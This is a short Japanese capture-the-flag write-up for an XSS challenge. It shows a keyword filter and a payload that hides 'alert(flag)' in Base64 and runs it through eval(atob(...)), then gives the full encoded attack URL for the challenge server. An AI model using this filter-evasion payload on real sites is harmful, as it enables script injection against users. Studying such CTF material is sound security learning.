XSSをさせるために``username``というクエリパラメータに``<script>``を埋め込む。

そこで``alert(flag)``実行させればいい訳だが、普通に入力しても以下のチェックに引っ掛かってしまう。

```javascript
if(username.includes("flag") || username.includes("alert")) {
    result = "<p>invalid input</p>";
  }
```

そこで、以下のように``alert(flag)``をBase64エンコードして、``atob``でデコードしてから実行させるようにする。

```
<script>eval(atob('YWxlcnQoZmxhZyk='))</script>
```

これを``username``に入れた以下のURLにアクセスする。

```
http://34.170.146.252:59059/?username=%3Cscript%3Eeval(atob(%27YWxlcnQoZmxhZyk=%27))%3C/script%3E
```

そして、``Submit this page!``をクリックすると、FLAGが表示される。